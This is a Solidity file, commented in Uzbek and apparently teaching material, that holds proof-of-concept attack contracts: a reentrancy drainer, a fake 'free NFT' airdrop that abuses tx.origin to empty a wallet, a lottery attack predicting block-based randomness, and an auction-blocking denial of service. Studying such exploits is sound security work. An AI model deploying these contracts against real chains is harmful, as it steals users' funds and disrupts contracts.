// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// A23 · Zaifliklarni isbotlovchi hujum kontraktlari (Proof of Concept). Faqat mahalliy EVM va o'quv uchun!

interface IBank { function qoy() external payable; function ol() external; }
interface IHamyon { function yubor(address payable kimga, uint256 summa) external; }
interface ILotereya { function oyna(uint256 taxmin) external payable; }
interface IAuksion { function taklif() external payable; }

/// 1) Reentrancy: receive() ichidan ol() ni qayta chaqiradi
contract BankHujum {
    IBank public immutable bank;
    constructor(address b) { bank = IBank(b); }

    function hujum() external payable {
        bank.qoy{value: msg.value}();
        bank.ol();
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) bank.ol();
    }
}

/// 2) tx.origin phishing: egasi “bepul NFT” kontraktini chaqiradi, u esa egasi nomidan hamyonni bo'shatadi
contract SoxtaAirdrop {
    address payable public immutable firibgar;
    constructor() { firibgar = payable(msg.sender); }

    function bepulNFTol(address hamyon) external {
        IHamyon(hamyon).yubor(firibgar, hamyon.balance);
    }
}

/// 5) Lotereya: xuddi shu blokda xuddi shu formulani hisoblab, faqat yutadigan taxmin bilan o'ynaydi
contract LotereyaHujum {
    function hujum(address lotereya) external payable {
        uint256 son = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, address(this)))) % 10;
        ILotereya(lotereya).oyna{value: msg.value}(son);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

/// 6) DoS: yetakchi bo'lib oladi va ETH qabul qilmaydi — hech kim undan yuqori taklif bera olmaydi
contract AuksionBloklovchi {
    function hujum(address auksion) external payable {
        IAuksion(auksion).taklif{value: msg.value}();
    }
    // receive() yo'q — qaytarilgan ETH rad etiladi
}
